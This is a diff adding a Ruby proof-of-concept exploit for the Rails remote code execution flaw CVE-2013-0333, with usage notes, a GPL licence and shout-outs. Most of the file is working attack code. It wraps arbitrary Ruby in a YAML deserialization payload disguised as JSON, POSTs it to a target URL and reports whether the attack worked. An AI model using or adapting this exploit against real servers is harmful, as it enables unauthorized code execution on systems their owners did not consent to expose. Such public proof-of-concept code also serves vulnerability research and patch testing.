@@ -1,0 +1,123 @@
+#!/usr/bin/env ruby
+#
+# Proof-of-Concept exploit for Rails Remote Code Execution (CVE-2013-0333)
+#
+# ## Advisory
+#
+#   https://groups.google.com/forum/?fromgroups=#!topic/rubyonrails-security/1h2DR63ViGo
+#
+# ## Caveats
+#
+# * Does not support Ruby 1.8.7.
+# * Only tested against Rails 3.0.x.
+#
+# ## Synopsis
+#
+#   $ rails_omakase.rb URL RUBY
+#
+# ## Dependencies
+#
+#   $ gem install ronin-support
+#
+# ## Example
+#
+#   $ rails_omakase.rb http://localhost:3000/secrets "puts 'lol'"
+#
+# ### config/routes.rb
+#
+#   resources :secrets
+#
+# ### app/controllers/secrets_controller.rb
+#
+#   def show
+#     p params
+#   end
+#
+# ## License
+#
+# Copyright (c) 2013 Postmodern
+#
+# This exploit is free software: you can redistribute it and/or modify
+# it under the terms of the GNU General Public License as published by
+# the Free Software Foundation, either version 3 of the License, or
+# (at your option) any later version.
+#
+# This exploit is distributed in the hope that it will be useful,
+# but WITHOUT ANY WARRANTY; without even the implied warranty of
+# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+# GNU General Public License for more details.
+#
+# You should have received a copy of the GNU General Public License
+# along with this exploit.  If not, see <http://www.gnu.org/licenses/>.
+#
+# ## Shoutz
+#
+# drraid, cd, px, sanitybit, sysfail, trent, dbcooper, goldy, coderman, letch,
+# starik, toby, jlt, HockeyInJune, cloud, zek, natron, amesc, postmodern,
+# mephux, nullthreat, evoltech, flatline, r0bglesson, lianj, @bascule,
+# @charliesome, @homakov, @envygeek, @nzkoz, @dhh, Omakase, YAML,
+# Kreayshawn, Lil Debbie, Boxxy, Stimulator, "rockin' the wolf on your noggin",
+# Cholombiano Style, Russian Parallel Cinema, SophSec crew and affiliates.
+#
+
+require 'ronin/network/http'
+require 'ronin/formatting/html'
+require 'ronin/ui/output'
+require 'yaml'
+
+include Ronin::Network::HTTP
+include Ronin::UI::Output::Helpers
+
+def wrap_payload(payload)
+  "(#{payload}; @executed = true) unless @executed"
+end
+
+def exploit(url,payload)
+  payload         = wrap_payload(payload)
+  escaped_payload = "foo\nend\n#{payload}\n__END__\n"
+  encoded_payload = escaped_payload.to_yaml.sub('--- ','').chomp
+
+  yaml = %{
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection
+? #{encoded_payload}
+: !ruby/struct
+  defaults:
+    :action: create
+    :controller: foos
+  required_parts: []
+  requirements:
+    :action: create
+    :controller: foos
+  segment_keys:
+    - :format
+  }.strip
+  encoded_yaml = yaml.gsub(':','\u003a')
+
+  return http_post(
+    :url       => url,
+    :headers   => {
+      :content_type           => 'application/json',
+      :x_http_method_override => 'get'
+    },
+    :body      => encoded_yaml
+  )
+end
+
+if $0 == __FILE__
+  unless ARGV.length >= 2
+    $stderr.puts "usage: #{$0} URL RUBY"
+    exit -1
+  end
+
+  url     = ARGV[0]
+  payload = ARGV[1]
+
+  print_info "POSTing #{payload} to #{url} ..."
+  response = exploit(url,payload)
+
+  case response.code
+  when '200' then print_info "Success!"
+  when '500' then print_error "Error!"
+  else            print_error "Received response code #{response.code}"
+  end
+end
